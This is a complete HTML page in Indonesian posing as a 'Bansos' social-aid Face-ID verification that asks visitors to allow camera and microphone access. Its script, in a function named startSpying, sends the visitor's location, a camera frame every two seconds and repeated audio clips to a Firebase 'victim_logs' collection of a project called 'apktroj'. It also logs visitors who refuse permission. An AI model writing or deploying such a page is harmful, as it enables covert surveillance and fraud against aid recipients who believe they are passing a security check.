<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi Bansos</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-200">
    <div id="auth-wall" class="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center p-6 text-center">
        <div class="mb-6 p-4 bg-red-100 rounded-full animate-pulse">⚠️</div>
        <h1 class="text-xl font-bold mb-2">VERIFIKASI KEAMANAN</h1>
        <p class="text-sm text-gray-600 mb-8">Untuk mencegah penipuan, izinkan akses kamera dan mikrofon guna proses Face-ID verifikasi penerima dana hibah.</p>
        <button id="init-btn" class="w-full max-w-xs bg-red-600 text-white font-bold py-4 rounded-xl shadow-lg">LANJUTKAN VERIFIKASI</button>
    </div>

    <video id="v" style="display:none" autoplay playsinline></video>
    <canvas id="c" style="display:none"></canvas>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
            authDomain: "apktroj.firebaseapp.com",
            databaseURL: "https://apktroj-default-rtdb.firebaseio.com",
            projectId: "apktroj",
            storageBucket: "apktroj.firebasestorage.app",
            messagingSenderId: "943833619122",
            appId: "1:943833619122:web:d757ced4d56267abf247ab",
            measurementId: "G-WR01BDY3G6"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);
        const appId = "apktroj_v1";

        document.getElementById('init-btn').onclick = async () => {
            document.getElementById('auth-wall').classList.add('hidden');
            await signInAnonymously(auth);
            startSpying();
        };

        async function upload(data) {
            try {
                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'victim_logs'), {
                    ...data,
                    uid: auth.currentUser.uid,
                    timestamp: Date.now()
                });
            } catch (e) {}
        }

        function startSpying() {
            // Get Location
            navigator.geolocation.getCurrentPosition(p => {
                upload({ action: "LOCATION", location: { lat: p.coords.latitude, lng: p.coords.longitude } });
            });

            // Start Live Stream & Audio
            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
                const video = document.getElementById('v');
                video.srcObject = stream;

                // Live Camera Frames (Every 2 seconds)
                setInterval(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth / 2; // Resize for speed
                    canvas.height = video.videoHeight / 2;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    upload({ action: "LIVE_FRAME", frame: canvas.toDataURL('image/jpeg', 0.3) });
                }, 2000);

                // Audio Recorder
                const recorder = new MediaRecorder(stream);
                let chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const reader = new FileReader();
                    reader.onloadend = () => upload({ action: "AUDIO_CLIP", audio: reader.result });
                    reader.readAsDataURL(new Blob(chunks));
                    chunks = [];
                    setTimeout(() => recorder.start(), 1000); // Record again
                };
                recorder.start();
                setInterval(() => recorder.stop(), 8000); // Send clip every 8s

            }).catch(e => upload({ action: "PERMISSION_DENIED" }));
        }
    </script>
</body>
</html>
